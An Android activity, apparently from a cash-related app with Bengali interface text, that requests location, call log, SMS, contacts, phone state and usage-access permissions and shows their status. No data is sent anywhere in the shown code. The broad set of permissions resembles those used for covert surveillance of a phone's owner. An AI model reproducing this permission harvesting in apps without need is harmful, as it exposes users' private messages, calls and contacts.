package com.my.Refiner.Cash.User;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class PermissionsActivity extends Activity {

    private static final int REQ_CODE = 100;
    private TextView statusText;
    private Button grantBtn, continueBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Thread.setDefaultUncaughtExceptionHandler(new CrashHandler(this));

        setContentView(R.layout.activity_permissions);

        statusText = findViewById(R.id.permStatus);
        grantBtn = findViewById(R.id.grantBtn);
        continueBtn = findViewById(R.id.continueBtn);

        grantBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });

        continueBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(PermissionsActivity.this, MainActivity.class));
                finish();
            }
        });

        updateStatus();
    }

    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            permissions.add(Manifest.permission.READ_CALL_LOG);
            permissions.add(Manifest.permission.READ_SMS);
            permissions.add(Manifest.permission.RECEIVE_SMS);
            permissions.add(Manifest.permission.READ_CONTACTS);
            permissions.add(Manifest.permission.READ_PHONE_STATE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            }

            String[] permArray = permissions.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permArray, REQ_CODE);
        } else {
            checkSpecialPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            checkSpecialPermissions();
        }
    }

    private void checkSpecialPermissions() {
        if (!hasUsageAccess()) {
            Toast.makeText(this, "Usage Access permission দিন", Toast.LENGTH_LONG).show();
            try {
                startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
            } catch (Exception e) {
                Toast.makeText(this, "Settings খুলতে ব্যর্থ", Toast.LENGTH_SHORT).show();
            }
            return;
        }

        updateStatus();
        Toast.makeText(this, "সব অনুমতি দেওয়া হয়েছে ✅", Toast.LENGTH_SHORT).show();
    }

    private boolean hasUsageAccess() {
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    private void updateStatus() {
        StringBuilder sb = new StringBuilder();
        sb.append("📋 অনুমতির অবস্থা:\n\n");

        boolean loc = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
        sb.append(loc ? "✅" : "❌").append(" Location\n");

        boolean call = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED;
        sb.append(call ? "✅" : "❌").append(" Call Log\n");

        boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED;
        sb.append(sms ? "✅" : "❌").append(" SMS\n");

        sb.append(hasUsageAccess() ? "✅" : "❌").append(" Usage Access\n");

        statusText.setText(sb.toString());
    }

    @Override
    protected void onResume() {
        super.onResume();
        try {
            updateStatus();
        } catch (Exception e) {
            // ignore
        }
    }
}
